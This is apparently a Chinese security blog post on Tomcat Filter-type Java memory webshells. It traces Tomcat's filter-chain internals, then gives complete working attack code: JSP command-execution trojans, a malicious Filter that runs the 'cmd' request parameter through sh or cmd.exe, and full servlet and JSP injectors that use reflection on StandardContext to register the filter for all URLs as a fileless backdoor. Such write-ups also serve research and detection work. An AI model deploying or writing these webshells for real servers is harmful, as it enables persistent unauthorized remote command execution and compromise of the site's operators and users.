# Java内存马 Tomcta之Filter型内存马

  
  
&lt;!--more--&gt;  
 ## 0x01 前言  
学过Servlet的应该知道filter(过滤器)，我们可以通过自定义过滤器来做到对用户的一些请求进行拦截修改等操作，下面是一张简单的流程图  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409132350623.png)
从上图可以看出，我们的请求会经过filter之后才会到Servlet，那么如果我们动态创建一个filter并且将其放在最前面，我们的filter就会最先执行，当我们在filter中添加恶意代码，就会进行命令执行，这样也就成为了一个内存Webshell  
所以我们的目标就是：动态注册恶意Filter，并且将其放到最前面  
## 0x02 Tomcat Filter流程分析  
在学习Filter内存马的注入之前，我们先来分析一下正常Filter在Tomcat中的流程是什么样的  
### 项目搭建  
首先在IDEA中创建Servlet，  
自定义Filter  
```java  
package org.example.servletdemo.Filters;    
    
import javax.servlet.*;    
import java.io.IOException;    
    
public class filter implements Filter{    
    @Override    
    public void init(FilterConfig filterConfig) throws ServletException {    
        System.out.println(&#34;Filter 初始构造完成&#34;);    
    }    
    
    @Override    
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {    
        System.out.println(&#34;执行了过滤操作&#34;);    
        filterChain.doFilter(servletRequest,servletResponse);    
    }    
    
    @Override    
    public void destroy() {    
    
    }    
}  
```  
然后修改web.xml文件，这里设置`url-pattern`为`/filter`即访问`/filter`才会触发  
```xml  
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;    
&lt;web-app xmlns=&#34;http://xmlns.jcp.org/xml/ns/javaee&#34;    
 xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;    
 xsi:schemaLocation=&#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&#34;    
 version=&#34;4.0&#34;&gt;    
 &lt;filter&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;    
 &lt;filter-class&gt;filter&lt;/filter-class&gt;    
 &lt;/filter&gt;    
 &lt;filter-mapping&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;    
 &lt;url-pattern&gt;/filter&lt;/url-pattern&gt;    
 &lt;/filter-mapping&gt;&lt;/web-app&gt;  
```  
访问 url，触发成功。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409162303366.png)
### 在访问/filter之后的流程分析  
流程分析，需要在此之前导入`catalina.jar`和`tomcat-websocket`包  
导入完毕之后，在`filter.java`下的`doFilter`这个地方打断点。并且访问`/filter`接口  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409162330463.png)
跟进到`doFilter`方法中，  
这里进入到了`ApplicationFilterChain`类的`doFilter()`方法，它主要是进行了`Globals.IS_SECURITY_ENABLED`，也就是全局安全服务是否开启的判断  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409162332772.png)
进入到这个方法，会直接执行到末尾，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409162334203.png)
继续跟进去，这里是`ApplicationFilterChain`类的`internalDoFilter()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409172333208.png)
其中filter是从`ApplicationFilterConfig filterConfig = this.filters[this.pos&#43;&#43;]`中来的，而filters的定义如下  
`private ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0];`  
现在是有两个filter的  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409172336916.png)
0是我们自己设置的filter，1是tomcat自带的filter，因此此时pos是1所以取到tomcat的filter。  
继续走，这里就调用了tomcat的filter的`doFilter()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409172345729.png)
再往下走，会走到`chain.doFilter()`这个地方，会发现这一个方法会回到`ApplicationFilterChain`类的`DoFilter()`方法里面  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409172346146.png)
这个地方需要理解一下，因为是一条`Filter`链，所以会一个个获取Filter，直到最后一个  
现在我们只定义了一个Filter，所以现在循环获取Filter链就是最后一次  
在最后一次获取Filter链的时候，会走到`this.servlet.service(request,response);`这个地方  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409172349993.png)
最后一个filter调用`servlet`的`service`方法  
上一个`Filter.doFilter()`方法中调用`FilterChain.doFilter()`方法将调用下一个`Filter.doFilter()`方法；这也就是我们的Filter的链，是去逐个获取的。  
最后一个Filter.doFilter()方法中调用的`FilterChain.doFilter()`方法将调用目标`Servlet.service()`方法。  
只要Filter链中任意一个Filter没有调用`FilterChain.doFilter()`方法，则目标`Servlet.service()`方法都不会被执行。  
### 在访问/filter之前的流程分析  
我们需要基于filter去实现一个内存马，就需要找到filter是如何被创建的。  
把断点下载最远的一处invoke()方法的地方  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409172359149.png)
我们看到的类是`StandardEngineValue`，对应的`Pipeline`就是`EnginePipeline`它进行了`invoke()`方法的调用，这个`invoke()`方法的调用的目的就是`AbstractAccessLogValue`类的`invoke()`方法。其实这一步已经安排了一个`request,wrapper,servlet`传递的顺序。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409180003510.png)
接着是`AbstarctAccessLogValue`类的`invoke()`方法，然后就是一步步调用`invoke()`方法。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409180004367.png)
如图所示  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409180004370.png)
至此，invoke()部分的所有流程分析完毕，接着继续往上看，也就是`doFilter()`方法。这个`doFilter()`方法也是由最近的那个`invoke()`方法调用的。如图，把断点下过去。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409180006756.png)
重点关注一下`filterChain`这个变量是什么？  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409180007009.png)
跟进`createFilterChain()`这个方法。使用`ApplicationFilterFactory.createFilterChain()`创建了一个过滤链，将`request,warpper,servlet`进行传递  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409180008111.png)
在`createFilterChain()`方法走一下流程。这里就是判断FilterMaps是否为空，若为空则会调用`context.findFilterMaps()`从`StandardContext`寻找并且返回一个FilterMaps数组。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409182340656.png)
再看后面代码  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409182341474.png)
遍历`StandardContext.filterMaps`得到filter与URL的映射关系并通过`matchDispatcher()`、`matchFilterURL()`方法进行匹配，匹配成功后，还需判断`StandardContext.filterConfigs`中，是否存在对应`filter`的实例，当实例不为空时通过`addFilter`方法，将管理filter实例的`filterConfig`添加入`filterChain`对象中。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409182343270.png)
这时候再进入`doFilter()`的方法其实是，将请求交给其`pipeline`去处理，由`pipeline`中的所有`valve`顺序请求处理。后续的就是我们前文分析过的再访问`/filter`之后的流程分析。  
### 总结一下分析流程  
#### 1、invoke()方法  
层层调用管道，在最后一个管道的地方会创建一个链子，这个链子就是FilterChain，再对里头的filter进行一些相关的匹配。  
#### 2、filterchain拿出来之后  
进行`doFilter()`工作，将请求交给对应的`pipeline`去处理，也就是进行一个`doFilter()-&gt;internalDoFilter()-&gt;doFilter()`直到最后一个filter被调用。  
#### 3、最后一个filter  
最后一个filter会执行完`doFilter()`操作，随后会跳转到`Servlet.service()`这里。  
#### 4、小结一下攻击思路  
分析完了运行流程，那如何攻击呢？  
攻击代码应该生效于这一块  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409182343270.png)
只需要构造含有恶意的filter的filterConfig和filterMaps，就可以达到触发的目的，并且他们都是从StandardContext中来的。  
而这个filterMaps中的数据对应`web.xml`中的`filter-mapping`标签。  
```xml  
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;    
&lt;web-app xmlns=&#34;http://xmlns.jcp.org/xml/ns/javaee&#34;    
 xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;    
 xsi:schemaLocation=&#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&#34;    
 version=&#34;4.0&#34;&gt;    
 &lt;filter&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;    
 &lt;filter-class&gt;filter&lt;/filter-class&gt;    
 &lt;/filter&gt;    
 &lt;filter-mapping&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;    
 &lt;url-pattern&gt;/filter&lt;/url-pattern&gt;    
 &lt;/filter-mapping&gt;&lt;/web-app&gt;  
```  
## 0x03 Filter型内存马攻击思路分析  
上文说过需要修改filterMaps，也就是如何修改web.xml  
filterMaps可以通过如下两个方法添加数据，对应的类是`StandardContext`这个类。  
```java  
@Override  
public void addFilterMap(FilterMap filterMap) {  
    validateFilterMap(filterMap);  
    // Add this filter mapping to our registered set  
    filterMaps.add(filterMap);  
    fireContainerEvent(&#34;addFilterMap&#34;, filterMap);  
}  
  
@Override  
public void addFilterMapBefore(FilterMap filterMap) {  
    validateFilterMap(filterMap);  
    // Add this filter mapping to our registered set  
    filterMaps.addBefore(filterMap);  
    fireContainerEvent(&#34;addFilterMap&#34;, filterMap);  
}  
```  
`StandardContext`这个类是一个容器类，它负责存储整个Web应用程序的数据和对象，并加载了web.xml中配置的多个`Servlet`、`Filter`对象以及它们的映射关系。  
里面有三个和Filter有关的成员变量：  
```java  
filterMaps变量：包含所有过滤器的URL映射关系   
filterDefs变量：包含所有过滤器包括实例内部等变量   
filterConfigs变量：包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理  
```  
filterConfigs成员变量是一个HashMap对象，里面存储了filter名称与对应的`ApplicationFilterConfig`对象的键值对，在`ApplicationFilterConfig`对象中则存储了Filter实例以及该实例在`web.xml`中的注册信息。  
filterDefs成员变量是一个HashMap对象，存储了filter名称与相应`FilterDef`的对象的键值对，而`FilterDef`对象则存储了Filter包括名称、描述、类名、Filter实例在内等与filter自身相关的数据。  
filterMaps中的`FilterMap`则记录了不同filter与`UrlPattern`的映射关系  
```java  
private HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs = new HashMap();   
  
private HashMap&lt;String, FilterDef&gt; filterDefs = new HashMap();   
  
private final StandardContext.ContextFilterMaps filterMaps = new StandardContext.ContextFilterMaps();  
```  
讲完了一些基础概念，来看一下`ApplicationFilterConfig`里面存了什么东西  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409190013729.png)
它有三个重要的东西：  
一个是ServletContext，一个是filter，一个是filterDef  
其中filterDef就是对应web.xml中的filter标签  
```xml  
&lt;filter&gt;    
 &lt;filter-name&gt;filter&lt;/filter-name&gt;    
 &lt;filter-class&gt;filter&lt;/filter-class&gt;    
&lt;/filter&gt;  
```  
从`org.apache.catalina.core.StandardContext#filterStart`中可以看到`filterConfig`可以通过`filterConfigs.put(name,filterConfig);`添加  
```java  
public boolean filterStart() {  
  
        if (getLogger().isDebugEnabled()) {  
            getLogger().debug(&#34;Starting filters&#34;);  
        }  
        // Instantiate and record a FilterConfig for each defined filter  
        boolean ok = true;  
        synchronized (filterConfigs) {  
            filterConfigs.clear();  
            for (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) {  
                String name = entry.getKey();  
                if (getLogger().isDebugEnabled()) {  
                    getLogger().debug(&#34; Starting filter &#39;&#34; &#43; name &#43; &#34;&#39;&#34;);  
                }  
                try {  
                    ApplicationFilterConfig filterConfig =  
                            new ApplicationFilterConfig(this, entry.getValue());  
                    filterConfigs.put(name, filterConfig);  
                } catch (Throwable t) {  
                    t = ExceptionUtils.unwrapInvocationTargetException(t);  
                    ExceptionUtils.handleThrowable(t);  
                    getLogger().error(sm.getString(  
                            &#34;standardContext.filterStart&#34;, name), t);  
                    ok = false;  
                }  
            }  
        }  
  
        return ok;  
    }  
  
```  
### 构造思路  
通过前文分析，得出构造的主要思路如下  
1、通过当前应用的ServletContext对象  
2、通过ServletContext对象再获取filterConfigs  
3、接着实现自定义想要注入的filter对象  
4、然后为自定义对象的filter创建一个FilterDef  
5、最后把ServletContext对象、filter对象、FilterDef全部都设置到filterConfigs即可完成内存马的实现  
## 0x04 Filter型内存马的实现  
JSP的无回显木马  
```java  
&lt;% Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;));%&gt;  
```  
回显的木马  
```java  
&lt;% if(request.getParameter(&#34;cmd&#34;)!=null){  
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;)).getInputStream();  
    int a = -1;  
    byte[] b = new byte[2048];  
    out.print(&#34;&lt;pre&gt;&#34;);  
    while((a=in.read(b))!=-1){  
        out.print(new String(b));  
    }  
    out.print(&#34;&lt;/pre&gt;&#34;);  
}  
%&gt;  
```  
将要这个有回显的木马插入到Filter里面，配置一个恶意的Filter  
```java  
import javax.servlet.*;    
import javax.servlet.http.HttpServletRequest;    
import javax.servlet.http.HttpServletResponse;    
import java.io.IOException;    
import java.io.InputStream;    
import java.util.Scanner;    
    
public class filter implements Filter{    
    @Override    
    public void init(FilterConfig filterConfig) throws ServletException {    
        System.out.println(&#34;Filter 初始构造完成&#34;);    
    }    
    
    @Override    
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {    
        HttpServletRequest request = (HttpServletRequest) servletRequest;    
        HttpServletResponse response = (HttpServletResponse) servletResponse;    
        if(request.getParameter(&#34;cmd&#34;) != null){    
            boolean isLinux = true;    
            String osTyp = System.getProperty(&#34;os.name&#34;);    
            if(osTyp !=null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)){    
                isLinux = false;    
            }    
            String[] cmds = isLinux ? new String[]{&#34;sh&#34;,&#34;-c&#34;,request.getParameter(&#34;cmd&#34;)} : new String[]{&#34;cmd.exe&#34;,&#34;/c&#34;,request.getParameter(&#34;cmd&#34;)};    
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();    
            Scanner s = new Scanner(in);    
            String output = s.hasNext() ? s.next() : &#34;&#34;;    
            response.getWriter().write(output);    
            response.getWriter().flush();    
        }    
        filterChain.doFilter(servletRequest,servletResponse);    
    }    
    
    @Override    
    public void destroy() {    
    
    }    
}  
```  
先跑一下  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409191824391.png)
本质上其实就是Filter中接受执行参数，但是如果我们在现实情况中需要动态的将该Filter给添加进去。  
由前面Filter实例存储分析得知`StandardContext` Filter实例存放在filterConfigs、filterDefs、filterConfigs这三个变量里面，将filter添加到这三个变量中即可将内存马打入。那么如何获取到`StandardContext`成为了问题的关键。  
### Filter型内存马  
尝试分步骤自己手写一下EXP，构造思路如下  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409191932864.png)
反射获取到standContext  
```java  
ServletContext servletContext = request.getSession().getServletContext();    
try {    
    Field appctx = servletContext.getClass().getDeclaredField(&#34;context&#34;);    
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);    
    Field stdctx = applicationContext.getClass().getDeclaredField(&#34;context&#34;);    
    stdctx.setAccessible(true);    
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);    
    
    String Filtername = &#34;cmdFilter&#34;;    
    Field Configs = standardContext.getClass().getDeclaredField(&#34;filterConfigs&#34;);    
    Configs.setAccessible(true);    
    Map filterConfigs = (Map) Configs.get(standardContext);    
} catch (Exception e) {    
    throw new RuntimeException(e);    
}  
```  
接着，定义一个Filter  
```java  
Filter filter = new Filter(){    
    @Override    
    public void init(FilterConfig filterConfig) throws ServletException {    
        System.out.println(&#34;Filter 初始构造完成&#34;);    
    }    
    
    @Override    
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {    
        HttpServletRequest request = (HttpServletRequest) servletRequest;    
        HttpServletResponse response = (HttpServletResponse) servletResponse;    
        if(request.getParameter(&#34;cmd&#34;) != null){    
            boolean isLinux = true;    
            String osTyp = System.getProperty(&#34;os.name&#34;);    
            if(osTyp !=null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)){    
                isLinux = false;    
            }    
            String[] cmds = isLinux ? new String[]{&#34;sh&#34;,&#34;-c&#34;,request.getParameter(&#34;cmd&#34;)} : new String[]{&#34;cmd.exe&#34;,&#34;/c&#34;,request.getParameter(&#34;cmd&#34;)};    
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();    
            Scanner s = new Scanner(in).useDelimiter(&#34;\\A&#34;);    
            String output = s.hasNext() ? s.next() : &#34;&#34;;    
            response.getWriter().write(output);    
            response.getWriter().flush();    
        }    
        filterChain.doFilter(servletRequest,servletResponse);    
    }    
    
    @Override    
    public void destroy() {    
    
    }    
};  
```  
再设置FilterDef和FilterMaps  
```java  
//反射获取FilterDef 设置filter等参数后，调用addFilterDef将FilterDef添加    
    Class&lt;?&gt; FilterDef = Class.forName(&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34;);    
    Constructor declaredConstructors = FilterDef.getDeclaredConstructor();    
    FilterDef o = (FilterDef) declaredConstructors.newInstance();    
    o.setFilter(filter);    
    o.setFilterName(Filtername);    
    o.setAsyncSupported(filter.getClass().getName());    
    standardContext.addFilterDef(o);    
    //反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去    
    Class&lt;?&gt; FilterMap = Class.forName(&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34;);    
    Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();    
    org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap)declaredConstructor.newInstance();    
    o1.addURLPattern(&#34;/*&#34;);    
    o1.setFilterName(Filtername);    
    o1.setDispatcher(DispatcherType.REQUEST.name());    
    standardContext.addFilterMap(o1);  
```  
最后将它们都添加到filterConfig里面，再放到web.xml里面  
```java  
//反射获取ApplicationFilterConfig，构造方法将FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去    
Class&lt;?&gt; ApplicationFilterConfig = Class.forName(&#34;org.apache.catalina.core.ApplicationFilterConfig&#34;);    
Constructor&lt;?&gt; declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);    
declaredConstructor1.setAccessible(true);    
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);    
filterConfigs.put(Filtername,filterConfig);    
response.getWriter().write(&#34;Success&#34;);  
```  
FilterShell.java  
```java  
package org.example.servletdemo;    
    
import org.apache.catalina.Context;    
import org.apache.catalina.core.ApplicationContext;    
import org.apache.catalina.core.ApplicationFilterConfig;    
import org.apache.catalina.core.StandardContext;    
import org.apache.tomcat.util.descriptor.web.FilterDef;    
import org.apache.tomcat.util.descriptor.web.FilterMap;    
    
import javax.servlet.*;    
import javax.servlet.annotation.WebServlet;    
import javax.servlet.http.HttpServlet;    
import javax.servlet.http.HttpServletRequest;    
import javax.servlet.http.HttpServletResponse;    
import java.io.IOException;    
import java.io.InputStream;    
import java.lang.reflect.Constructor;    
import java.lang.reflect.Field;    
import java.util.Map;    
import java.util.Scanner;    
    
@WebServlet(&#34;/demoServlet&#34;)    
public class FilterShell extends HttpServlet {    
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {    
        try {    
            ServletContext servletContext = request.getSession().getServletContext();    
            Field appctx = servletContext.getClass().getDeclaredField(&#34;context&#34;);    
            appctx.setAccessible(true);    
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);    
            Field stdctx = applicationContext.getClass().getDeclaredField(&#34;context&#34;);    
            stdctx.setAccessible(true);    
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);    
    
            String Filtername = &#34;cmdFilter&#34;;    
            Field Configs = standardContext.getClass().getDeclaredField(&#34;filterConfigs&#34;);    
            Configs.setAccessible(true);    
            Map filterConfigs = (Map) Configs.get(standardContext);    
    
            Filter filter = new Filter(){    
                @Override    
                public void init(FilterConfig filterConfig) throws ServletException {    
                    System.out.println(&#34;Filter 初始构造完成&#34;);    
                }    
    
                @Override    
                public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {    
                    HttpServletRequest request = (HttpServletRequest) servletRequest;    
                    HttpServletResponse response = (HttpServletResponse) servletResponse;    
                    if(request.getParameter(&#34;cmd&#34;) != null){    
                        boolean isLinux = true;    
                        String osTyp = System.getProperty(&#34;os.name&#34;);    
                        if(osTyp !=null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)){    
                            isLinux = false;    
                        }    
                        String[] cmds = isLinux ? new String[]{&#34;sh&#34;,&#34;-c&#34;,request.getParameter(&#34;cmd&#34;)} : new String[]{&#34;cmd.exe&#34;,&#34;/c&#34;,request.getParameter(&#34;cmd&#34;)};    
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();    
                        Scanner s = new Scanner(in).useDelimiter(&#34;\\A&#34;);    
                        String output = s.hasNext() ? s.next() : &#34;&#34;;    
                        response.getWriter().write(output);    
                        response.getWriter().flush();    
                    }    
                    filterChain.doFilter(servletRequest,servletResponse);    
                }    
    
                @Override    
                public void destroy() {    
    
                }    
            };    
        //反射获取FilterDef 设置filter等参数后，调用addFilterDef将FilterDef添加    
            Class&lt;?&gt; FilterDef = Class.forName(&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34;);    
            Constructor declaredConstructors = FilterDef.getDeclaredConstructor();    
            FilterDef o = (FilterDef) declaredConstructors.newInstance();    
            o.setFilter(filter);    
            o.setFilterName(Filtername);    
            o.setAsyncSupported(filter.getClass().getName());    
            standardContext.addFilterDef(o);    
            //反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去    
            Class&lt;?&gt; FilterMap = Class.forName(&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34;);    
            Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();    
            org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap)declaredConstructor.newInstance();    
            o1.addURLPattern(&#34;/*&#34;);    
            o1.setFilterName(Filtername);    
            o1.setDispatcher(DispatcherType.REQUEST.name());    
            standardContext.addFilterMap(o1);    
            //反射获取ApplicationFilterConfig，构造方法将FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去    
            Class&lt;?&gt; ApplicationFilterConfig = Class.forName(&#34;org.apache.catalina.core.ApplicationFilterConfig&#34;);    
            Constructor&lt;?&gt; declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);    
            declaredConstructor1.setAccessible(true);    
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);    
            filterConfigs.put(Filtername,filterConfig);    
            response.getWriter().write(&#34;Success&#34;);    
    
        } catch (Exception e) {    
            throw new RuntimeException(e);    
        }    
    
    }    
    
    @Override    
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {    
        super.doGet(req, resp);    
    }    
}  
```  
如果是文件上传应该是.jsp文件  
```jsp  
&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;  
&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;  
&lt;%@ page import=&#34;java.util.Map&#34; %&gt;  
&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34; %&gt;  
&lt;%@ page import=&#34;java.lang.reflect.Constructor&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationFilterConfig&#34; %&gt;  
&lt;%@ page import=&#34;org.apache.catalina.Context&#34; %&gt;  
&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;  
&lt;%@ page import=&#34;java.util.Scanner&#34; %&gt;  
  
&lt;%  
    final String name = &#34;Drunkbaby&#34;;  
    // 获取上下文  
    ServletContext servletContext = request.getSession().getServletContext();  
  
    Field appctx = servletContext.getClass().getDeclaredField(&#34;context&#34;);  
    appctx.setAccessible(true);  
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
  
    Field stdctx = applicationContext.getClass().getDeclaredField(&#34;context&#34;);  
    stdctx.setAccessible(true);  
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
  
    Field Configs = standardContext.getClass().getDeclaredField(&#34;filterConfigs&#34;);  
    Configs.setAccessible(true);  
    Map filterConfigs = (Map) Configs.get(standardContext);  
  
    if (filterConfigs.get(name) == null){  
        Filter filter = new Filter() {  
            @Override  
            public void init(FilterConfig filterConfig) throws ServletException {  
  
            }  
  
            @Override  
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {  
                HttpServletRequest req = (HttpServletRequest) servletRequest;  
                if (req.getParameter(&#34;cmd&#34;) != null) {  
                    boolean isLinux = true;  
                    String osTyp = System.getProperty(&#34;os.name&#34;);  
                    if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)) {  
                        isLinux = false;  
                    }  
                    String[] cmds = isLinux ? new String[] {&#34;sh&#34;, &#34;-c&#34;, req.getParameter(&#34;cmd&#34;)} : new String[] {&#34;cmd.exe&#34;, &#34;/c&#34;, req.getParameter(&#34;cmd&#34;)};  
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();  
                    Scanner s = new Scanner( in ).useDelimiter(&#34;\\a&#34;);  
                    String output = s.hasNext() ? s.next() : &#34;&#34;;  
                    servletResponse.getWriter().write(output);  
                    servletResponse.getWriter().flush();  
                    return;  
                }  
                filterChain.doFilter(servletRequest, servletResponse);  
            }  
  
            @Override  
            public void destroy() {  
  
            }  
  
        };  
  
        FilterDef filterDef = new FilterDef();  
        filterDef.setFilter(filter);  
        filterDef.setFilterName(name);  
        filterDef.setFilterClass(filter.getClass().getName());  
        standardContext.addFilterDef(filterDef);  
  
        FilterMap filterMap = new FilterMap();  
        filterMap.addURLPattern(&#34;/*&#34;);  
        filterMap.setFilterName(name);  
        filterMap.setDispatcher(DispatcherType.REQUEST.name());  
  
        standardContext.addFilterMapBefore(filterMap);  
  
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);  
        constructor.setAccessible(true);  
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);  
  
        filterConfigs.put(name, filterConfig);  
        out.print(&#34;Success&#34;);  
    }  
%&gt;  
```  
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/java%E5%86%85%E5%AD%98%E9%A9%AC-tomcta%E4%B9%8Bfilter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/  

